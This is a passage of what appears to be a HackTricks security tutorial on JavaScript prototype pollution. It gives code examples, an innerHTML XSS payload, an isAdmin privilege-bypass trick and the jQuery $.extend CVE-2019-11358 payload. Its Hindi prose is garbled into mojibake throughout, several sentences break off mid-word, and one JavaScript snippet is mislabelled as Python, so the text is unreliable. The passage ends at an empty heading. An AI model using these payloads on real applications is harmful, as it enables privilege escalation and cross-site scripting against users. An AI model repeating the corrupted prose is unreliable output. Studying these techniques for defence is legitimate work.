# NodeJS - \_\_proto\_\_ & prototype рдкреНрд░рджреВрд╖рдг

<details>

<summary><strong>рдЬреАрд░реЛ рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## JavaScript рдореЗрдВ рдСрдмреНрдЬ
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
рдПрдХ рдЦрд╛рд▓реА рдСрдмреНрдЬреЗрдХреНрдЯ рдПрдХ рдЦрд╛рд▓реА рд╢рдмреНрджрдХреЛрд╢ рдХреЗ рд╕рдорд╛рди рд╣реИ, рдЬрд┐рд╕реЗ `{}` рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдлрдВрдХреНрд╢рди рдФрд░ рдХреНрд▓рд╛рд╕реЗрд╕

рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ, рдХреНрд▓рд╛рд╕реЗрд╕ рдФрд░ рдлрдВрдХреНрд╢рди рдЧрд╣рд░реЗ рд░реВрдк рд╕реЗ рдЬреБрдбрд╝реЗ рд╣реЛрддреЗ рд╣реИрдВ, рдЬрд╣рд╛рдВ рдлрдВрдХреНрд╢рди рдЕрдХреНрд╕рд░ рдХреНрд▓рд╛рд╕ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдорд╛рддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддреЗ рд╣реИрдВред рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреА рдкреНрд░рд╛рдХреГрддрд┐рдХ рдХреНрд▓рд╛рд╕ рд╕рдорд░реНрдерди рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдирд┐рд░реНрдорд╛рддрд╛рдУрдВ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдХреНрд▓рд╛рд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### JavaScript рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк

JavaScript рджреНрд╡рд╛рд░рд╛ рд░рдирдЯрд╛рдЗрдо рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХрд╛ рд╕рдВрд╢реЛрдзрди, рдЬреЛрдбрд╝рдирд╛ рдпрд╛ рд╣рдЯрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдпрд╣ рд▓рдЪреАрд▓рд╛рддрд╛ рд╡рд░реНрдЧ рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рдЧрддрд┐рд╢реАрд▓ рд╡рд┐рд╕реНрддрд╛рд░ рд╕рдВрднрд╛рд╡рд┐рдд рдмрдирд╛рддрд╛ рд╣реИред

`toString` рдФрд░ `valueOf` рдЬреИрд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рд╡реНрдпрд╡рд╣рд╛рд░ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ JavaScript рдХреЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рдгрд╛рд▓реА рдХреА рд▓рдЪреАрд▓рддрд╛ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред

## рд╡рд┐рд░рд╛рд╕рдд

рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рдореЗрдВ, рдЧреБрдг/рд╡рд┐рдзрд┐рдпрд╛рдБ рд╡рд░реНрдЧреЛрдВ рд╕реЗ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реА рдЬрд╛рддреА рд╣реИрдВред рдпреЗ рд╡рд░реНрдЧ рдЙрд╕ рд╡рд░реНрдЧ рдХреЗ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдпрд╛ рдПрдХ рдЦрд╛рд▓реА рдСрдмреНрдЬ
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
рдСрдмреНрдЬреЗрдХреНрдЯ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рддрдХ рдкрд╣реБрдВрдЪ рдЗрд╕рдХреЗ рдЬрд░рд┐рдП рд╕рдВрднрд╡ рд╣реИ:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
рдЬрдм Object prototype рдореЗрдВ properties рдЬреЛрдбрд╝ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рд╣рд░ JavaScript object рдЗрди рдирдП properties рдХреЛ рд╡рд╛рд░рд┐рд╕реНрдд рдХрд░реЗрдЧрд╛:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реБрд╢рди

рдЬрд╣рд╛рдВ `__proto__` рдЙрдкрдпреЛрдЧ рдкрд░ рдкреНрд░рддрд┐рдмрдВрдз рд▓рдЧрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдПрдХ рд╡рд┐рдХрд▓реНрдк рд╣реИ:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
рдпрд╣ рдХреЗрд╡рд▓ `Vehicle` рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рд╕реЗ рдмрдирд╛рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рддрд╛ рд╣реИ, рдЬрд┐рдиреНрд╣реЗрдВ `beep`, `hasWheels`, `honk`, рдФрд░ `isElectric` рдкреНрд░реЙрдкрд░реНрдЯреАрдЬрд╝ рджреЗрддрд╛ рд╣реИред

рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рд╡реИрд╢реНрд╡рд┐рдХ рд░реВрдк рд╕реЗ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреЛ рддрд░реАрдХреЗ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

1. `Object.prototype` рдХреЛ рд╕реАрдзреЗ рдкреНрд░рджреВрд╖рдгрд┐рдд рдХрд░рдирд╛:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. рдПрдХ рдмрд╣реБрдд рд╣реА рдЖрдо рд╕рдВрд░рдЪрдирд╛ рдХреЗ constructor рдХрд╛ prototype рдкреНрд░рджреВрд╖рдг рдХрд░рдирд╛:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
After these operations, рд╣рд░ JavaScript object `goodbye` рдФрд░ `greet` methods рдХреЛ execute рдХрд░ рд╕рдХрддрд╛ рд╣реИред

## рдЕрдиреНрдп objects рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░рдирд╛

### рдПрдХ class рд╕реЗ Object.prototype рддрдХ

рдПрдХ scenario рдореЗрдВ рдЬрд╣рд╛рдБ рдЖрдк **рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ object рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЖрдкрдХреЛ **`Object.prototype` рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ** рддреЛ рдЖрдк рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЗ рд╕рд╛рде рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### рдПрд░реЗ рддрддреНрд╡ рдкреНрд░рджреВрд╖рдг

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк рдЬреЗрдПрд╕ рдореЗрдВ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдЧреБрдгреЛрдВ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдПрд░реЗ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░рдиреЗ рдХрд╛ рдПрдХреНрд╕реЗрд╕ рд╣реИ рддреЛ рдЖрдк **рдПрд░реЗ рдХреЗ рдорд╛рдиреЛрдВ рдХреЛ рднреА рдкреНрд░рджреВрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рдирдХрд╛ рдПрдХреНрд╕реЗрд╕ **рдЗрдВрдбреЗрдХреНрд╕ рдХреЗ рджреНрд╡рд╛рд░рд╛** рд╣реЛрддрд╛ рд╣реИ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк рдорд╛рдиреЛрдВ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдЙрди рдЗрдВрдбреЗрдХреНрд╕ рдХреЛ рдкреНрд░рджреВрд╖рд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬреЛ рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рд▓рд┐рдЦреЗ рдирд╣реАрдВ рдЬрд╛рддреЗ рд╣реИрдВ)ред
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html elements pollution

JS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ HTML element рдЙрддреНрдкрдиреНрди рдХрд░рддреЗ рд╕рдордп **`innerHTML`** рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ **рдЕрдзрд┐рдХрд╛рд░рд┐рдХ HTML рдХреЛрдб рд▓рд┐рдЦрдиреЗ** рдХреЗ рд▓рд┐рдП **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред [рдЗрд╕ рд▓реЗрдЦ рд╕реЗ рд╡рд┐рдЪрд╛рд░ рдФрд░ рдЙрджрд╛рд╣рд░рдг](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/)ред

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## рдЙрджрд╛рд╣рд░рдг

### рдореВрд▓ рдЙрджрд╛рд╣рд░рдг

рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдПрдХ рджреЛрд╖ рдХреЗ рдХрд╛рд░рдг рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ `Object.prototype` рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХреНрдпреЛрдВрдХрд┐ рдЕрдзрд┐рдХрд╛рдВрд╢ рдСрдмреНрдЬ
```javascript
if (user.admin) {
```
рдпрджрд┐ рдЧреБрдгрд╡рддреНрддрд╛ **`admin` рдЕрдкрд░рд┐рднрд╛рд╖рд┐рдд** рд╣реИ рддреЛ рдПрдХ PP рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рд╕рддреНрдп рдореЗрдВ рд╕реЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
рдЗрд╕рдХреЗ рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рдХрд╛ рдкреАрдЫрд╛ рдХрд░рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ рдХрд┐ рдЧреБрдгреЛрдВ рдХреЛ рдордирд┐рдкреБрд▓реЗрдЯ рдХрд░рдирд╛ рдЬрд┐рд╕рд╕реЗ рдЕрдЧрд░ рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рдХреБрдЫ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЗрдирдкреБрдЯ рдХреЗ рдЙрдкрд░ рдирд┐рдпрдВрддреНрд░рдг рд╣реЛ, рддреЛ рд╡реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд╕рднреА рдСрдмреНрдЬ
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto рдкреНрд░рджреВрд╖рдг рд╕реЗ RCE рддрдХ

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╕реЗ XSS рддрдХ

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019тАУ11358: jQuery $ .extend рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╣рдорд▓рд╛

[рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рдЗрд╕ рд▓реЗрдЦ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) jQuery рдореЗрдВ, `$ .extend` рдлрд╝рдВрдХреНрд╢рди рдЧрд╣рд░реА рдХреЙрдкреА рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдЧрд▓рдд рддрд░реАрдХреЗ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдП рддреЛ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдЖрдо рддреМрд░ рдкрд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреНрд▓реЛрдирд┐рдВрдЧ рдпрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реЗ рдЧреБрдгреЛрдВ рдХреЛ рдорд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рдП, рдирдП рдСрдмреНрдЬ
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
рдпрд╣ рд╡рдВрд░реБрд▓реНрдирд░рдмрд┐рд▓рд┐рдЯреА, рдЬрд┐рд╕реЗ CVE-2019тАУ11358 рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╣рдЪрд╛рдирд╛ рдЧрдпрд╛ рд╣реИ, рджрд┐рдЦрд╛рддреА рд╣реИ рдХрд┐ рдПрдХ рдЧрд╣рд░реА рдХреЙрдкреА рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдореЛрдВ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдирд╛ рдкрдбрд╝ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдЕрдирдзрд┐рдХреГрдд рдПрдбрдорд┐рди рдПрдХреНрд╕реЗрд╕ рдЕрдЧрд░ `isAdmin` рдЬреИрд╕реА рдЧреБрдгрд╡рддреНрддрд╛рдПрдБ рд╕рд╣реА рдЕрд╕реНрддрд┐рддреНрд╡ рд╕рддреНрдпрд╛рдкрди рдХреЗ рдмрд┐рдирд╛ рдЬрд╛рдВрдЪреА рдЬрд╛рддреА рд╣реИрдВред

### CVE-2018тАУ3721, CVE-2019тАУ10744: рд▓реЛрдбрд╛рд╢ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реБрд╢рди рд╣рдорд▓рд╛

[рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рдЗрд╕ рд▓реЗрдЦ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) рдиреЗ рд╕рдорд╛рди рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реБрд╢рди рд╡рдВрд░реБрд▓реНрдирд░рдмрд┐рд▓рд┐рдЯреАрдЬрд╝ (CVE-2018тАУ3721, CVE-2019тАУ10744) рдХрд╛ рд╕рд╛рдордирд╛ рдХрд┐рдпрд╛ред рдЗрди рдореБрджреНрджреЛрдВ рдХреЛ рд╕рдВрд╕реНрдХрд░рдг 4.17.11 рдореЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

### рдПрдХ рдФрд░ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдЬрд┐рд╕рдореЗрдВ CVEs рд╣реИрдВ

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реБрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реБрд╢рди рд╡рдВрд░реБрд▓реНрдирд░рдмрд┐рд▓рд┐рдЯреАрдЬрд╝ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдФрд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдмрд░реНрдк рд╕реНрдпреВрдЯ рдПрдХреНрд╕рдЯреЗрдВрд╢рдиред рдпрд╣ рдЙрдкрдХрд░рдг рд╕реНрдХреИрдирд┐рдВрдЧ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреА рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реБрд╢рди рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреА рдкрд╣рдЪрд╛рди рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЬреНрдЮрд╛рдд рдЧреИрдЬреЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ - рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реБрд╢рди рдХреЛ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдиреЛрдб.рдЬреЗрдПрд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИред
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): рдпрд╣ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реБрд╢рди рд╡рдВрд░реБрд▓реНрдирд░рдмрд┐рд▓рд┐рдЯреАрдЬрд╝ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рддрд╛ рд╣реИред рдпрд╣ [рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реБрд╢рди](https://portswigger.net/research/server-side-prototype-pollution) рдореЗрдВ рд╡рд░реНрдгрд┐рдд рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

### рдиреЛрдбрдЬреЗрдПрд╕ рдореЗрдВ AST рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реБрд╢рди

рдиреЛрдбрдЬреЗрдПрд╕ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрдиреНрд╕ рдФрд░ рдЯрд╛рдЗрдкрд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЬреИрд╕реА рдлрд╝рдВрдХреНрд╢рдирд▓рд┐рдЯреАрдЬрд╝ рдХреЗ рд▓рд┐рдП рдПрдмреНрд╕реНрдЯреНрд░реИрдХреНрдЯ рд╕рд┐рдВрдЯреИрдХреНрд╕ рдЯреНрд░реАрдЬрд╝ (AST) рдХрд╛ рд╡реНрдпрд╛рдкрдХ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЦрдВрдб рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрдиреНрд╕, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рдФрд░ рдкрдЧ рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реБрд╢рди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╡рдВрд░реБрд▓реНрдирд░рдмрд┐рд▓рд┐рдЯреАрдЬрд╝ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИред

#### рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рд╡рдВрд░реБрд▓реНрдирд░рдмрд┐рд▓рд┐рдЯреА рд╡рд┐рд╢реНрд▓реЗрд╖рдг

